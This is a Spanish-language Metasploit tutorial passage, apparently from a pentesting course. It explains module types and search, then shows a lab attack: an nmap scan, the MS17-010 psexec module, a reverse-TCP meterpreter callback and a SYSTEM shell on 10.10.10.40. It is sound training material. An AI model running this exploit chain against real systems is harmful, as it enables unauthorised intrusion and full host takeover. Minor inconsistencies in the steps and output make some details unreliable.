Como mencionamos anteriormente, los `modules` de Metasploit son scripts preparados con un propósito específico y funciones correspondientes que ya se han desarrollado y probado en el campo. La categoría `exploit` consiste en los llamados proof-of-concept (`POCs`) que se pueden usar para explotar vulnerabilidades existentes de manera mayormente automatizada. Muchas personas a menudo piensan que el fracaso del exploit desacredita la existencia de la vulnerabilidad sospechada. Sin embargo, esto solo prueba que el exploit de Metasploit no funciona y no que la vulnerabilidad no exista. Esto se debe a que muchos exploits requieren personalización según los hosts objetivo para que el exploit funcione. Por lo tanto, las herramientas automatizadas como el framework de Metasploit solo deben considerarse una herramienta de apoyo y no un sustituto de nuestras habilidades manuales.

Una vez que estamos en la `msfconsole`, podemos seleccionar de una lista extensa que contiene todos los módulos disponibles de Metasploit. Cada uno de ellos está estructurado en carpetas, que se verán así:

### Syntax

```r
<No.> <type>/<os>/<service>/<name>
```

### Example

```r
794   exploit/windows/ftp/scriptftp_list
```

### Index No.

La etiqueta `No.` se mostrará para seleccionar el exploit que queremos posteriormente durante nuestras búsquedas. Veremos cuán útil puede ser la etiqueta `No.` para seleccionar módulos específicos de Metasploit más adelante.

### Type

La etiqueta `Type` es el primer nivel de segregación entre los `modules` de Metasploit. Mirando este campo, podemos decir qué logrará el código de este módulo. Algunos de estos `types` no son directamente utilizables como lo sería un módulo `exploit`, por ejemplo. Sin embargo, están configurados para introducir la estructura junto con los interactuables para una mejor modularización. Para explicar mejor, aquí están los tipos posibles que podrían aparecer en este campo:

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Escaneo, fuzzing, sniffing y capacidades administrativas. Ofrecen asistencia y funcionalidad adicional.|
|`Encoders`|Aseguran que los payloads lleguen intactos a su destino.|
|`Exploits`|Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del payload.|
|`NOPs`|(No Operation code) Mantienen los tamaños de los payloads consistentes en los intentos de exploit.|
|`Payloads`|Código que se ejecuta remotamente y llama de vuelta a la máquina atacante para establecer una conexión (o shell).|
|`Plugins`|Scripts adicionales que pueden integrarse dentro de una evaluación con `msfconsole` y coexistir.|
|`Post`|Amplia gama de módulos para recopilar información, pivotar más profundamente, etc.|

Nota que al seleccionar un módulo para la entrega de payload, el comando `use <no.>` solo se puede usar con los siguientes módulos que se pueden usar como `initiators` (o módulos interactuables):

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Escaneo, fuzzing, sniffing y capacidades administrativas. Ofrecen asistencia y funcionalidad adicional.|
|`Exploits`|Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del payload.|
|`Post`|Amplia gama de módulos para recopilar información, pivotar más profundamente, etc.|

### OS

La etiqueta `OS` especifica para qué sistema operativo y arquitectura se creó el módulo. Naturalmente, diferentes sistemas operativos requieren diferentes códigos para obtener los resultados deseados.

### Service

La etiqueta `Service` se refiere al servicio vulnerable que se está ejecutando en la máquina objetivo. Para algunos módulos, como los `auxiliary` o `post`, esta etiqueta puede referirse a una actividad más general, como `gather`, refiriéndose a la recopilación de credenciales, por ejemplo.

### Name

Finalmente, la etiqueta `Name` explica la acción real que se puede realizar utilizando este módulo creado para un propósito específico.

---

## Searching for Modules

Metasploit también ofrece una función de búsqueda bien desarrollada para los módulos existentes. Con la ayuda de esta función, podemos buscar rápidamente entre todos los módulos utilizando `tags` específicos para encontrar uno adecuado para nuestro objetivo.

### MSF - Search Function

```r
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

Por ejemplo, podemos intentar encontrar el exploit `EternalRomance` para sistemas operativos Windows más antiguos. Esto podría verse así:

---

### MSF - Searching for EternalRomance

```r
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution



msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

También podemos hacer nuestra búsqueda un poco más grosera y reducirla a una categoría de servicios. Por ejemplo, para el CVE, podríamos especificar el año (`cve:<year>`), la plataforma Windows (`platform:<os>`), el tipo de módulo que queremos encontrar (`type:<auxiliary/exploit/post>`), el rango de fiabilidad (`rank:<rank>`), y el nombre de búsqueda (`<pattern>`). Esto reduciría nuestros resultados solo a aquellos que coincidan con todos los anteriores.

### MSF - Specific Search

```r
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

---

## Module Selection

Para seleccionar nuestro primer módulo, primero

 necesitamos encontrar uno. Supongamos que tenemos un objetivo que ejecuta una versión de SMB vulnerable a los exploits de EternalRomance (MS17_010). Hemos descubierto que el puerto 445 del servidor SMB está abierto al escanear el objetivo.

```r
nmap -sV 10.10.10.40

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.40
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

Iniciaríamos `msfconsole` y buscaríamos este nombre exacto de exploit.

### MSF - Search for MS17_010

```r
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

A continuación, queremos seleccionar el módulo adecuado para este escenario. Del escaneo `Nmap`, hemos detectado el servicio SMB que se ejecuta en la versión `Microsoft Windows 7 - 10`. Con algún escaneo adicional del SO, podemos suponer que esto es un Windows 7 ejecutando una instancia vulnerable de SMB. Luego procedemos a seleccionar el módulo con el `index no. 2` para probar si el objetivo es vulnerable.

---
## Using Modules

Dentro de los módulos interactivos, hay varias opciones que podemos especificar. Estas se utilizan para adaptar el módulo de Metasploit al entorno dado. Porque en la mayoría de los casos, siempre necesitamos escanear o atacar diferentes direcciones IP. Por lo tanto, requerimos este tipo de funcionalidad para permitirnos establecer nuestros objetivos y ajustarlos. Para verificar qué opciones deben configurarse antes de que el exploit pueda enviarse al host objetivo, podemos usar el comando `show options`. Todo lo que se necesita configurar antes de que ocurra la explotación tendrá un `Yes` en la columna `Required`.

### MSF - Select Module

```r

<SNIP>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   
   
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Aquí vemos cuán útiles pueden ser las etiquetas `No.`. Porque ahora, no tenemos que escribir toda la ruta, sino solo el número asignado al módulo de Metasploit en nuestra búsqueda. Podemos usar el comando `info` después de seleccionar el módulo si queremos saber algo más sobre el módulo. Esto nos dará una serie de información que puede ser importante para nosotros.

### MSF - Module Information

```r
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSy

nergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

Una vez que estamos satisfechos de que el módulo seleccionado es el adecuado para nuestro propósito, necesitamos establecer algunas especificaciones para personalizar el módulo y usarlo con éxito contra nuestro host objetivo, como configurar el objetivo (`RHOST` o `RHOSTS`).

### MSF - Target Specification

```r
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Además, existe la opción `setg`, que especifica opciones seleccionadas por nosotros como permanentes hasta que el programa se reinicie. Por lo tanto, si estamos trabajando en un host objetivo particular, podemos usar este comando para establecer la dirección IP una vez y no cambiarla nuevamente hasta que cambiemos nuestro enfoque a una dirección IP diferente.

### MSF - Permanent Target Specification

```r
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be un admin share (ADMIN$,C$,...) o una no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Una vez que todo está configurado y listo para comenzar, podemos proceder a lanzar el ataque. Nota que el payload no se configuró aquí, ya que el predeterminado es suficiente para esta demostración.

### MSF - Exploit Execution

```r
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.

10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

Ahora tenemos un shell en la máquina objetivo y podemos interactuar con él.

### MSF - Target Interaction

```r
C:\Windows\system32> whoami

whoami
nt authority\system
```

Este ha sido un ejemplo rápido y sencillo de cómo `msfconsole` puede ayudar rápidamente, pero sirve como un excelente ejemplo de cómo funciona el framework. Solo se necesitó un módulo sin ninguna selección de `payload`, `encoding` o `pivoting` entre sesiones o trabajos.